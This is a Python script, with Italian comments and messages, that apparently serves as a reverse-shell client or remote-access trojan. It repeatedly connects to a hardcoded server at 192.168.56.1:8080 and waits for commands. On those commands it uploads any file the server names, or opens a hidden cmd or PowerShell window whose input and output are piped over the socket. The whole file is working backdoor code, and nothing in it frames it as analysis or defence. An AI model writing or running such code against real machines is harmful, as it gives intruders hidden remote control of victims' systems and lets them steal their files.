import os
import socket
import subprocess
import threading
import time
import random

s = socket.socket()
port = 8080
#host = input("Inserire l'indirizzo del server: ")
host = "192.168.56.1"

tentativo = 0

#tentativi di connessione al server
while True:

    tentativo += 1
    tempoTentativo = random.uniform(10, 30)

    try:
        s.connect((host, port))
        print(f"\nConnection to {host} established succesfully")
        break 

    except socket.error:

        for i in range(int(tempoTentativo), 0, -1):

            print(f"Attempt {tentativo} - Request timed out. Retrying in {i} seconds  ", end="\r")
            time.sleep(1)
            

def terminaleNascosto(shell):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return subprocess.Popen(shell, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, startupinfo=startupinfo, shell=True)

def leggiOutput(shell, s):
    while True:
        output = shell.stdout.readline()
        if output == '' and shell.poll() is not None:
            break
        if output:
            s.send(output.encode())

while True:
    command = s.recv(1024).decode()
    print("Comando ricevuto")

    if command == "down":
        file_path = s.recv(5000).decode()
        with open(file_path, "rb") as file:
            s.send(file.read())
        print("File inviato con successo")

    elif command == "send":
        
        print("Codice di esempio")

    elif command in ["cmd", "powershell"]:
        shell = terminaleNascosto(command)
        threading.Thread(target=leggiOutput, args=(shell, s), daemon=True).start()

        print(f"Apertura {command}")

        while True:
            CMDcommand = s.recv(8192).decode()

            if CMDcommand.lower() == "exit":
                print(f"Chiusura {command}")
                shell.terminate()
                break

            elif CMDcommand.lower() == "cls":
                
                print("CLS non valido")

            else:
                shell.stdin.write(CMDcommand + "\n")
                shell.stdin.flush()

    elif command == "close":
        s.close()
        print("Sessione terminata con successo")
        break

    else:
        print("Comando sconosciuto")
